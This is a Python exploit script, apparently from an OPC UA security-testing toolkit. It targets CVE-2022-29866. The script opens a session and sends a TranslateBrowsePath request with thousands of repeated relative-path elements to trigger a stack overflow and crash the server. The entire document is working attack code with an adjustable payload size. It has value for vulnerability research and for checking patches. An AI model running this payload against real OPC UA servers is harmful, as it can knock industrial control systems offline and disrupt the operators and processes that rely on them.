# Translate Browse Path: Call Stack Overflow
#   Triggering a stack overflow exception in a server that doesn't limit TranslateBrowsePath resolving calls
#
# CVEs:
#   - CVE-2022-29866: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2022-29866.pdf
#

import datetime

from protocol import *
from config import *

def attack(server_details, factor=4000):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # Prepare message
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=554)

    # Array of browse path
    AMONUT_ELEMENTS_BrowsePathElement = 1
    AMONUT_ELEMENTS_RelativePathElement = 2 * factor

    array_of_browse_path = b""

    single_browse_path = b""
    single_browse_path += b"\x01" # Node ID: Four byte encoded numeric (0x01)
    single_browse_path += b"\x00" # Node ID: Namespace 0
    single_browse_path += struct.pack("<H", 12637) # Node ID: ID numeric

    single_relative_path = b""
    single_relative_path += b"\x00" # Node ID: Two byte encoded numeric (0x00)
    single_relative_path += struct.pack("<b", 47) # Node ID: Identifier Number - has encoding
    single_relative_path += b"\x00" # IsInverse: (0-false, 1-true)
    single_relative_path += b"\x01" # Include sub types: (0-false, 1-true)
    single_relative_path_target_name = "ApplyChanges"
    single_relative_path += struct.pack("<H", 0) # Namespace
    single_relative_path += struct.pack("<I", len(single_relative_path_target_name)) + single_relative_path_target_name.encode() # name


    single_relative_path += b"\x00" # Node ID: Two byte encoded numeric (0x00)
    single_relative_path += struct.pack("<b", 47) # Node ID: Identifier Number - encoding of
    single_relative_path += b"\x01" # IsInverse: (0-false, 1-true)
    single_relative_path += b"\x01" # Include sub types: (0-false, 1-true)
    single_relative_path_target_name = "ServerConfiguration"
    single_relative_path += struct.pack("<H", 0) # Namespace
    single_relative_path += struct.pack("<I", len(single_relative_path_target_name)) + single_relative_path_target_name.encode() # name


    single_browse_path += struct.pack("<I", AMONUT_ELEMENTS_RelativePathElement) # array size
    single_browse_path += single_relative_path * AMONUT_ELEMENTS_RelativePathElement

    array_of_browse_path += struct.pack("<I", AMONUT_ELEMENTS_BrowsePathElement) # array size
    array_of_browse_path += single_browse_path * AMONUT_ELEMENTS_BrowsePathElement

    message = message_header + message_body + array_of_browse_path

    # Send
    print("[-] Sending MSG Request - Translate Browse Path to Node ID x {} times".format(AMONUT_ELEMENTS_RelativePathElement))
    opcua.send_recv(message, count=1, should_recv=True)

    time.sleep(0.2)

    # Close connection
    print("[-] Closing connection")
    opcua.close()
